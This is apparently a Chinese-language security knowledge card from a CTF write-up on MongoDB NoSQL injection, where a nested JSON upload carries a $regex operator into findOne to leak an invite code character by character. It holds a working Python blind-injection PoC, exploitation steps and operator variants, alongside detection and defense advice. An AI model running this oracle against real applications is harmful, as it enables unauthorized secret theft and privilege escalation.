---
id: web-nodejs-mongodb-json-operator-injection-prefix-oracle
title: MongoDB 嵌套对象注入：可控 JSON 的 $regex 进入 findOne 做前缀盲注
type: scenario
domain: web
path: web/nodejs
technique: mongodb-json-operator-injection-regex-prefix-oracle
aliases:
- MongoDB NoSQL 注入
- $regex 前缀盲注
- 嵌套 JSON 注入
- findOne 操作符注入
- reviewer invite code 泄露
tags:
- nodejs
- mongodb
- nosql
- injection
- regex
- blind
- auth-bypass
- privilege-escalation
- json
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V127
  verified_at: '2026-11-06T04:28:36+08:00'
  notes: 已对照原文与图01-02核对：/reviewer/profile 上传 profileFile JSON、committee.registration.reference 进入 valueAtPath→slotValue→assignmentSlotQuery 动态键→reviewerInvites.findOne；score>=minimumScore 37、track systems；$regex ^ 前缀盲注 36 位 hex 得 code a3645b49d4aba32537c18ae53d049d2eae28；email committee-shadow@aaa26.big1 完成 claim，均与卡片一致。未验证点：PoC 未本机复跑；CTF 无组件版本；frontmatter 无 sources/source_url。
---

## 一句话结论

应用把用户可控的嵌套 JSON 原样当作 MongoDB 查询值传给 `findOne` 时，JSON 里的 `$regex` 等操作符会被驱动当作查询条件执行；只要接口对“是否命中”有布尔回显，就能按前缀逐位爆破出 invite code、重置 token 等秘密，进而提权。

## 原理

- MongoDB 查询是 BSON 文档，字段值除了字面量，还可以是操作符对象，例如 `{ code: { $regex: "^a" } }`。Node.js 驱动不会区分“用户提交的 JSON 对象”和“查询操作符对象”，对象会原样进入查询。
- 漏洞点在于“取一个嵌套字段的值作为查询值”的动态构造：
  ```js
  // slotValue 来自用户上传 JSON 的 retainedMetadata
  const query = { used: false, track, kind, rubricId, [slotField]: slotValue };
  await reviewerInvites.findOne(query);
  ```
  当 `slotValue` 是 `{ $regex: "^<prefix>" }` 时，查询从“code 等于某值”变成“code 匹配某前缀”，且 MongoDB 的 `$regex` 支持前缀匹配。
- 布尔回显把 `findOne` 的结果暴露成“存在/不存在”：命中时页面显示有可用席位，未命中显示没有。攻击者据此构造 oracle，对 36 位十六进制 code 逐位尝试 16 个字符，只需约 36×16 次请求，而不是 16^36 次穷举。
- 成立前提是：用户输入能到达查询值位置、查询层没有做类型/白名单校验、命中结果可被观察（响应文案、计数、状态码或时间差）。

## 触发条件

- 后端为 MongoDB，查询由 Node.js 驱动构造，且把请求中的对象/嵌套 JSON 直接作为字段值。
- 存在“导入/上传 JSON → 存入某集合 → 后续按该字段查询另一集合”的数据流（profile、配置、筛选条件、邀请码校验等）。
- 命中与未命中在响应中有可区分差异（文案、数量、状态码、延迟）。
- 被查询字段的值是固定字符集且足够长（如十六进制 token），使逐位爆破可行。

## 利用步骤

1. 注册并登录普通账号，找到接受 JSON 文件/嵌套 JSON 的导入入口。
2. 构造注入 JSON，把目标字段的值写成 `{"$regex": "^"}`，先确认能命中任意记录（oracle 返回“存在”）。
3. 把前缀改为 `^a`、`^b`…逐字符尝试；命中则保留该字符，进入下一位。
4. 对 `[0-9a-f]{36}` 形式的 invite code，循环 36 位、每位 16 次即可还原完整 code。
5. 用泄露的 code（以及同集合中可推断/泄露的 email）完成 claim，获得 reviewer/admin 等更高角色。
6. 若目标还校验分数、track、areas 等业务条件，需同时满足这些条件，否则注入 JSON 根本到不了查询点。

## PoC

最小前缀 oracle（按目标实际字段名和表单字段调整）：

```python
import json, requests

BASE = "http://target"
s = requests.Session()
s.post(f"{BASE}/login", data={"username": "u", "password": "p"})

def oracle(prefix):
    profile = {"committee": {"registration": {"reference": {"$regex": "^" + prefix}}}}
    s.post(f"{BASE}/reviewer/profile",
           data=[("track", "systems"), ("areas", "systems"),
                 ("areas", "review process"), ("areas", "artifact sanity"),
                 ("score", "100")],
           files={"profileFile": ("r.json", json.dumps(profile), "application/json")})
    s.post(f"{BASE}/reviewer/profile/submit")
    r = s.post(f"{BASE}/reviewer/profile/service-sync")
    return "available assignment slot" in r.text

code = ""
for _ in range(36):
    for c in "0123456789abcdef":
        if oracle(code + c):
            code += c
            break
print(code)
```

说明：PoC 为原文流程的结构化复现，未在本机执行；仅用于授权测试。原文环境还要求 profile 分数不低于 rubric 的 `minimumScore`，否则查询不会执行。

## 变体与关联

- 变体（操作符）：`$ne`、`$gt`、`$in`、`$exists`、`$where`（需服务端允许）可替代 `$regex`；`$regex` 最适合做前缀 oracle。
- 变体（通道）：无布尔回显时可用时间盲注（`$where` 中 sleep）、错误差异、响应长度差异或写入副作用做 oracle。
- 变体（入口）：任何“JSON 导入后作为查询值”的功能都可能复用，如筛选表达式、告警规则、用户配置、邀请码校验。
- 关联：[[web-nodejs-strapi-password-reset-nosql-injection]]（`$gt` 直接重置管理员密码的经典案例）；[[web-nodejs-vm2-buffer-slab-jwt-secret-leak]]（同链后续：reviewer 身份后从内存泄露 JWT secret）。
- 边界：查询层做了字符串强转/类型校验、MongoDB 禁用操作符、或没有可观察差异时，本手法不成立。

## 检测与防御

- 检测：MongoDB 慢查询/审计日志中出现 `$regex`、`$ne`、`$gt`、`$where` 等操作符对象；上传 JSON 中出现 `$` 开头的键；同一账号对同步/校验接口的高频、逐字符变化的请求。
- 防御：对所有进入查询的用户值做严格类型校验（只接受 string/number/boolean），拒绝对象与数组；用 schema 校验（Joi/zod/class-validator）并在查询前强转 `String(value)`；必要时用 `$eq` 包装字面量。
- 加固：邀请码/token 只存哈希、使用足够长的随机值；不向普通用户暴露“是否存在可用席位”的布尔信号；对敏感查询接口限速并记录异常模式。
